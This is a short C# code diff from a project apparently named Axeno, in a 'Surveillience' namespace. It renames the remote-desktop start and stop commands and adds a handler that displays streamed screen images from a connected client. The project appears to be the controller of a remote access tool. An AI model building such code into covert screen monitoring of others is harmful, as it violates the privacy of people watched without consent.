@@ -22,7 +22,7 @@ namespace Axeno.Networking.Functions.Surveillience
         {
             MsgPack msgpack = new MsgPack();
             msgpack.ForcePathObject("Packet").AsString = "RemoteDesktop";
-            msgpack.ForcePathObject("Option").AsString = "startRDP";
+            msgpack.ForcePathObject("Option").AsString = "StartStreaming";
             msgpack.ForcePathObject("Quality").AsInteger = quality;
             msgpack.ForcePathObject("Screen").AsInteger = screen;
 
@@ -32,7 +32,7 @@ namespace Axeno.Networking.Functions.Surveillience
         {
             MsgPack msgpack = new MsgPack();
             msgpack.ForcePathObject("Packet").AsString = "RemoteDesktop";
-            msgpack.ForcePathObject("Option").AsString = "stopRDP";
+            msgpack.ForcePathObject("Option").AsString = "StopStreaming";
             return msgpack.Encode2Bytes();
         }
         public static byte[] GetInfo()
@@ -50,6 +50,20 @@ namespace Axeno.Networking.Functions.Surveillience
                 cli.Rdp.cmbScreens.Items.Add("Screen " + i);
             }
             cli.Rdp.cmbScreens.SelectedIndex = 0;
+        }
+        public void HandleStream(Client cli, MsgPack msgpack)
+        {
+            byte[] buffer = msgpack.ForcePathObject("Stream").GetAsBytes();
+            using (MemoryStream ms = new MemoryStream(buffer, 0, buffer.Length))
+            {
+                BitmapImage image = new BitmapImage();
+                image.BeginInit();
+                image.StreamSource = ms;
+                image.CacheOption = BitmapCacheOption.OnLoad;
+                image.EndInit();
+
+                cli.Rdp.imgdesktop.Source = image;
+            }
         }
     }
 }
